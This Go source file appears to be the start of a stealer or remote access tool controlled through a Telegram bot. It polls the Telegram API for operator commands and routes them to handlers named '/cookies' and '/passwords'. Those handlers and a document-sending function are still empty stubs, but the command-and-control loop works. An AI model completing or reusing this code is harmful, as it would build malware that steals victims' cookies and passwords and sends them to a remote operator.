package main 

import (
	"os"
	"fmt"
	"time"
	"net/http"
	"io/ioutil"
	"encoding/json"
)

var (
	token string
	getUpdates string

	response chan []byte
	command chan string
)

type Config struct {
	Token string `json:"token"`
}

type Chat struct {
	ChatID int `json:"id"`
}

type Message struct {
	ID int `json:"message_id"` 
	Timestamp int `json:"date"`
	Text string `json:"text"`
	From Chat `json:"sender_chat"` 
}

type Update struct {
	Msg Message `json:"message"`
}

type ResponseUpdates struct {
	Results []Update `json:"result"`
}

type requestSendDocument struct {
	ChatID int `json:"chat_id"`
	Document string `json:"document"`
	Caption string `json:"caption"`
}

func readToken() string {

	configFile, err := os.Open("config.json")

	configBytes, err := ioutil.ReadAll(configFile)

	if err != nil {
		
		fmt.Println("Error while reading config file")

	}

	var config Config
	
	err = json.Unmarshal(configBytes, &config)

	if err != nil {

		fmt.Println("Error while unpacking the json")

	}

	return config.Token

}

func poller(interval int) {

	for {

		res, err := http.Get(getUpdates)

		// Error handling for GET request
		if err != nil {
			
			fmt.Println("Error in polling request")

		}

		body, err := ioutil.ReadAll(res.Body)

		// Error handling for body reading
		if err != nil {

			fmt.Println("Error in reading the response body")

		}

		response <- body 
		
		// Setting the interval between two requests
		time.Sleep(time.Duration(interval) * time.Second)

	}

}

func getCommand() {
	
	lastCommand := 0

	for {
	
		body := <- response

		updates := ResponseUpdates{}

		err := json.Unmarshal(body, &updates)

		if err != nil {

			fmt.Println("Error with unpacking the json", err)
		
		}	

		if updates.Results[len(updates.Results) - 1].Msg.ID > lastCommand{
			
			lastCommand = updates.Results[len(updates.Results) - 1].Msg.ID 
			
			command <- updates.Results[len(updates.Results) - 1].Msg.Text 
		}

	}

}

func sendDocuments() {
	
}

func execCommand() {
	

	for {
		
		cmd := <- command
			
		switch cmd {
		
			case "/cookies":
				
			case "/passwords":
				

		}

	}
}

func main() {
	
	token = readToken()
	getUpdates = "https://api.telegram.org/bot" + token + "/getUpdates"

	response = make(chan []byte)
	command = make(chan string)

	go poller(5)

	go getCommand()

	go execCommand()

	for {
		
	}

}
